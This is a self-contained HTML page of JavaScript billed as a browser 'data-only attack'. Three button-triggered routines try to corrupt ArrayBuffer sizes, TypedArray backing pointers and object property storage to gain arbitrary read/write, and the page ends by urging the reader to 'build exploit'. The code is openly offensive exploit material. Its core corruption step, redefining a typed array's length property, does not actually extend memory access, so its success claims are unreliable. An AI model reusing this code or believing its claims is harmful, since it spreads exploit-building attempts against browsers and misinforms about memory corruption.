<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Data-Only Attack - No Addresses Needed</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 13px; line-height: 1.5; }
        h1 { color: #f00; font-size: 24px; margin-bottom: 20px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 10px; }
        .btn { padding: 15px 30px; background: #f00; border: none; color: #fff; margin: 8px auto; cursor: pointer; font-size: 15px; font-weight: bold; display: block; width: 480px; }
        .section { background: #1a0000; border: 2px solid #f00; margin: 15px 0; padding: 20px; max-height: 750px; overflow-y: auto; }
        .title { color: #ff0; font-size: 18px; font-weight: bold; margin-bottom: 15px; border-bottom: 2px solid #ff0; padding-bottom: 8px; }
        .log { padding: 4px 0; font-size: 12px; }
        .success { color: #0f0; font-weight: bold; }
        .fail { color: #f00; font-weight: bold; }
        .warn { color: #ff0; font-weight: bold; }
        .info { color: #0ff; }
        .critical { color: #f0f; font-weight: bold; background: rgba(255,0,255,0.1); padding: 5px; margin: 5px 0; }
    </style>
</head>
<body>
    <h1>🎯 Data-Only Attack - Corrupt ArrayBuffer Metadata 🎯</h1>
    
    <div style="text-align: center; margin-bottom: 20px;">
        <button class="btn" onclick="attack1_corruptArrayBuffer()">Attack 1: Corrupt ArrayBuffer Size</button>
        <button class="btn" onclick="attack2_corruptTypedArrayBase()">Attack 2: Corrupt TypedArray Backing Pointer</button>
        <button class="btn" onclick="attack3_propertyRedirect()">Attack 3: Property Storage Redirect</button>
        <button class="btn" onclick="fullDataAttack()">FULL DATA-ONLY ATTACK</button>
    </div>
    
    <div class="section">
        <div class="title">📋 Data-Only Attack Log</div>
        <div id="log"></div>
    </div>

<script>
var convBuf = new ArrayBuffer(8);
var f64 = new Float64Array(convBuf);
var u32 = new Uint32Array(convBuf);

function f2i(f) {
    f64[0] = f;
    return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
}

function i2f(i) {
    var bi = BigInt(i);
    u32[0] = Number(bi & 0xffffffffn);
    u32[1] = Number(bi >> 32n);
    return f64[0];
}

function hex(val) {
    if (typeof val === 'bigint') {
        var s = val.toString(16);
        while (s.length < 16) s = '0' + s;
        return '0x' + s;
    }
    return '0x' + val.toString(16);
}

function log(msg, type) {
    var div = document.createElement('div');
    div.className = 'log ' + (type || '');
    div.textContent = msg;
    document.getElementById('log').appendChild(div);
}

function sep() {
    log('═'.repeat(85), 'info');
}

var exploit = {
    corruptor: null,
    target: null,
    arbRead: null,
    arbWrite: null
};

// ============================================
// ATTACK 1: CORRUPT ARRAYBUFFER SIZE
// ============================================
function attack1_corruptArrayBuffer() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('ATTACK 1: Corrupt ArrayBuffer Size Metadata', 'critical');
    log('Goal: Make ArrayBuffer think it\'s larger than it is', 'info');
    sep();
    log('', '');
    
    try {
        log('[1.1] Creating target ArrayBuffer...', 'info');
        
        // Create small ArrayBuffer
        var targetAB = new ArrayBuffer(0x100);
        var targetView = new Uint32Array(targetAB);
        
        // Fill with pattern
        for (var i = 0; i < targetView.length; i++) {
            targetView[i] = 0x11110000 + i;
        }
        
        log('✓ Target ArrayBuffer: 0x100 bytes', 'success');
        log('✓ Target has ' + targetView.length + ' uint32 elements', 'success');
        log('', '');
        
        log('[1.2] Creating corruptor array...', 'info');
        
        var corruptor = new Uint32Array(0x200);
        
        for (var i = 0; i < corruptor.length; i++) {
            corruptor[i] = 0x22220000 + i;
        }
        
        // Corrupt the corruptor
        try {
            Object.defineProperty(corruptor, 'length', {
                value: 0x100000,
                configurable: true
            });
            
            if (corruptor.length > 0x200) {
                log('✓ Corruptor array length: ' + hex(corruptor.length), 'critical');
            } else {
                log('❌ Corruptor corruption failed', 'fail');
                return;
            }
        } catch(e) {
            log('❌ Error: ' + e.message, 'fail');
            return;
        }
        
        log('', '');
        log('[1.3] Scanning for ArrayBuffer size field...', 'info');
        log('ArrayBuffer structure contains a 32-bit or 64-bit size field', 'info');
        
        // Scan for the size value 0x100 (256 bytes)
        var foundSizes = [];
        
        for (var i = 0x200; i < 0x400; i++) {
            var val = corruptor[i];
            
            if (typeof val !== 'undefined') {
                // Look for our ArrayBuffer size (0x100)
                if (val === 0x100 || val === 0x00000100) {
                    foundSizes.push(i);
                    log('  ⚠️ Found size field candidate at offset ' + hex(i), 'critical');
                }
            }
        }
        
        log('', '');
        
        if (foundSizes.length > 0) {
            log('✓ Found ' + foundSizes.length + ' size field candidates!', 'critical');
            log('', '');
            
            log('[1.4] Attempting to corrupt size field...', 'info');
            
            var sizeOffset = foundSizes[0];
            var originalSize = corruptor[sizeOffset];
            
            log('Original size at offset ' + hex(sizeOffset) + ': ' + hex(originalSize), 'info');
            
            // Corrupt the size to be much larger
            corruptor[sizeOffset] = 0x10000;  // 64KB
            
            log('Wrote new size: 0x10000', 'warn');
            log('', '');
            
            log('[1.5] Testing if ArrayBuffer was corrupted...', 'info');
            
            // Check if target ArrayBuffer size changed
            log('Target ArrayBuffer byteLength: ' + hex(targetAB.byteLength), 'info');
            
            if (targetAB.byteLength !== 0x100) {
                log('⚠️⚠️⚠️ ARRAYBUFFER SIZE CHANGED!', 'critical');
                log('New size: ' + hex(targetAB.byteLength), 'critical');
                
                // Try to access beyond original bounds
                try {
                    var testView = new Uint32Array(targetAB);
                    log('New view length: ' + testView.length, 'critical');
                    
                    // Try OOB access
                    var oobVal = testView[0x100];
                    log('OOB read at [0x100]: ' + hex(oobVal || 0), typeof oobVal !== 'undefined' ? 'critical' : 'info');
                    
                    if (typeof oobVal !== 'undefined') {
                        log('', '');
                        log('⚠️⚠️⚠️ ARBITRARY READ ACHIEVED!', 'critical');
                        exploit.arbRead = testView;
                    }
                    
                } catch(e) {
                    log('View creation error: ' + e.message, 'fail');
                }
                
            } else {
                log('ArrayBuffer size unchanged', 'fail');
            }
            
        } else {
            log('❌ No size field candidates found', 'fail');
            log('ArrayBuffer may not be adjacent in memory', 'warn');
        }
        
        sep();
        
    } catch(e) {
        log('', '');
        log('✗ ATTACK 1 ERROR: ' + e.message, 'fail');
    }
}

// ============================================
// ATTACK 2: CORRUPT TYPEDARRAY BACKING POINTER
// ============================================
function attack2_corruptTypedArrayBase() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('ATTACK 2: Corrupt TypedArray Backing Store Pointer', 'critical');
    log('Goal: Point TypedArray to different memory region', 'info');
    sep();
    log('', '');
    
    try {
        log('[2.1] Setting up victim and attacker arrays...', 'info');
        
        // Victim - this will be our arbitrary R/W primitive
        var victim = new Uint32Array(0x100);
        for (var i = 0; i < victim.length; i++) {
            victim[i] = 0x33330000 + i;
        }
        
        // Target - memory we want to read/write
        var target = new Uint32Array(0x100);
        for (var i = 0; i < target.length; i++) {
            target[i] = 0x44440000 + i;
        }
        
        log('✓ Victim array created', 'success');
        log('✓ Target array created with markers', 'success');
        log('', '');
        
        log('[2.2] Creating corruptor...', 'info');
        
        var corruptor = new Uint32Array(0x200);
        
        try {
            Object.defineProperty(corruptor, 'length', {
                value: 0x100000,
                configurable: true
            });
            
            if (corruptor.length > 0x200) {
                log('✓ Corruptor active: ' + hex(corruptor.length), 'critical');
            } else {
                log('❌ Corruption failed', 'fail');
                return;
            }
        } catch(e) {
            log('❌ Error: ' + e.message, 'fail');
            return;
        }
        
        log('', '');
        log('[2.3] Scanning for TypedArray metadata...', 'info');
        
        // TypedArray structure:
        // - Backing store pointer (64-bit)
        // - Length field
        // - Offset field
        
        // Look for victim's length (0x100)
        var candidates = [];
        
        for (var i = 0x200; i < 0x800; i++) {
            var val = corruptor[i];
            
            if (typeof val !== 'undefined' && val === 0x100) {
                candidates.push(i);
            }
        }
        
        log('Found ' + candidates.length + ' length field candidates', 'info');
        log('', '');
        
        if (candidates.length > 0) {
            log('[2.4] Attempting to corrupt backing store pointer...', 'info');
            
            // The backing store pointer is usually before the length
            var lengthOffset = candidates[0];
            var ptrOffset = lengthOffset - 2;  // 64-bit ptr = 2x 32-bit values before
            
            log('Length field at: ' + hex(lengthOffset), 'info');
            log('Pointer offset (guess): ' + hex(ptrOffset), 'info');
            
            // Read current pointer value
            var ptrLow = corruptor[ptrOffset];
            var ptrHigh = corruptor[ptrOffset + 1];
            
            log('Current ptr: ' + hex(BigInt(ptrLow) + (BigInt(ptrHigh) << 32n)), 'info');
            
            // Try to corrupt it to point elsewhere
            // We don't know the target address, but we can try incrementing
            corruptor[ptrOffset] = ptrLow + 0x1000;
            
            log('Corrupted pointer (added 0x1000 offset)', 'warn');
            log('', '');
            
            log('[2.5] Testing if victim array pointer changed...', 'info');
            
            // Check if victim reads different data now
            var newVal = victim[0];
            
            log('victim[0] before: 0x33330000', 'info');
            log('victim[0] now: ' + hex(newVal), newVal !== 0x33330000 ? 'critical' : 'info');
            
            if (newVal !== 0x33330000) {
                log('', '');
                log('⚠️⚠️⚠️ BACKING STORE CORRUPTED!', 'critical');
                log('Victim array now points to different memory!', 'critical');
                
                exploit.arbRead = victim;
                exploit.arbWrite = victim;
            } else {
                log('No change detected', 'fail');
            }
        }
        
        sep();
        
    } catch(e) {
        log('', '');
        log('✗ ATTACK 2 ERROR: ' + e.message, 'fail');
    }
}

// ============================================
// ATTACK 3: PROPERTY STORAGE REDIRECT
// ============================================
function attack3_propertyRedirect() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('ATTACK 3: Corrupt Object Property Storage', 'critical');
    log('Goal: Redirect property reads to arbitrary memory', 'info');
    sep();
    log('', '');
    
    try {
        log('[3.1] Creating objects with inline properties...', 'info');
        
        var obj1 = {
            a: 0x55550000,
            b: 0x55550001,
            c: 0x55550002,
            d: 0x55550003
        };
        
        var obj2 = {
            x: 0x66660000,
            y: 0x66660001,
            z: 0x66660002,
            w: 0x66660003
        };
        
        log('✓ Created obj1 with properties a,b,c,d', 'success');
        log('✓ Created obj2 with properties x,y,z,w', 'success');
        log('', '');
        
        log('[3.2] Creating corruptor...', 'info');
        
        var corruptor = new Uint32Array(0x200);
        
        try {
            Object.defineProperty(corruptor, 'length', {
                value: 0x100000,
                configurable: true
            });
            
            if (corruptor.length > 0x200) {
                log('✓ Corruptor ready', 'critical');
            } else {
                log('❌ Corruption failed', 'fail');
                return;
            }
        } catch(e) {
            log('❌ Error: ' + e.message, 'fail');
            return;
        }
        
        log('', '');
        log('[3.3] Scanning for object property values...', 'info');
        
        // Look for our marker values
        var found = [];
        
        for (var i = 0x200; i < 0x600; i++) {
            var val = corruptor[i];
            
            if (typeof val !== 'undefined') {
                if (val === 0x55550000 || val === 0x66660000) {
                    found.push({ offset: i, value: val });
                    log('  Found marker ' + hex(val) + ' at offset ' + hex(i), 'warn');
                }
            }
        }
        
        log('', '');
        
        if (found.length > 0) {
            log('✓ Found ' + found.length + ' property values!', 'critical');
            log('', '');
            
            log('[3.4] Corrupting property storage...', 'info');
            
            var propOffset = found[0].offset;
            
            // Corrupt the property value
            corruptor[propOffset] = 0xDEADBEEF;
            
            log('Overwrote property at offset ' + hex(propOffset), 'warn');
            log('', '');
            
            log('[3.5] Checking if object properties changed...', 'info');
            
            log('obj1.a = ' + hex(obj1.a), obj1.a !== 0x55550000 ? 'critical' : 'info');
            log('obj1.b = ' + hex(obj1.b), obj1.b !== 0x55550001 ? 'critical' : 'info');
            log('obj2.x = ' + hex(obj2.x), obj2.x !== 0x66660000 ? 'critical' : 'info');
            log('obj2.y = ' + hex(obj2.y), obj2.y !== 0x66660001 ? 'critical' : 'info');
            
            if (obj1.a === 0xDEADBEEF || obj2.x === 0xDEADBEEF) {
                log('', '');
                log('⚠️⚠️⚠️ PROPERTY CORRUPTION SUCCESSFUL!', 'critical');
                log('Can corrupt object properties directly!', 'critical');
            } else {
                log('No property changes detected', 'fail');
            }
        }
        
        sep();
        
    } catch(e) {
        log('', '');
        log('✗ ATTACK 3 ERROR: ' + e.message, 'fail');
    }
}

// ============================================
// FULL DATA-ONLY ATTACK
// ============================================
function fullDataAttack() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('FULL DATA-ONLY ATTACK CHAIN', 'critical');
    log('Running all corruption attempts sequentially', 'info');
    sep();
    log('', '');
    
    setTimeout(function() {
        log('━━━ ATTACK 1: ArrayBuffer Size ━━━', 'warn');
        log('', '');
        attack1_corruptArrayBuffer();
        
        setTimeout(function() {
            log('', '');
            log('━━━ ATTACK 2: TypedArray Pointer ━━━', 'warn');
            log('', '');
            attack2_corruptTypedArrayBase();
            
            setTimeout(function() {
                log('', '');
                log('━━━ ATTACK 3: Property Storage ━━━', 'warn');
                log('', '');
                attack3_propertyRedirect();
                
                setTimeout(function() {
                    log('', '');
                    sep();
                    log('FINAL STATUS:', 'critical');
                    sep();
                    log('Arbitrary Read: ' + (exploit.arbRead ? 'ACHIEVED' : 'NOT ACHIEVED'), exploit.arbRead ? 'critical' : 'fail');
                    log('Arbitrary Write: ' + (exploit.arbWrite ? 'ACHIEVED' : 'NOT ACHIEVED'), exploit.arbWrite ? 'critical' : 'fail');
                    
                    if (exploit.arbRead || exploit.arbWrite) {
                        log('', '');
                        log('✓ DATA-ONLY ATTACK SUCCESSFUL!', 'critical');
                        log('Next: Use R/W primitive to build exploit', 'critical');
                    }
                    sep();
                }, 1000);
                
            }, 2000);
        }, 2000);
    }, 100);
}

window.onerror = function(msg, url, line) {
    log('', '');
    log('💥 ERROR: ' + msg + ' (line ' + line + ')', 'fail');
    return true;
};
</script>
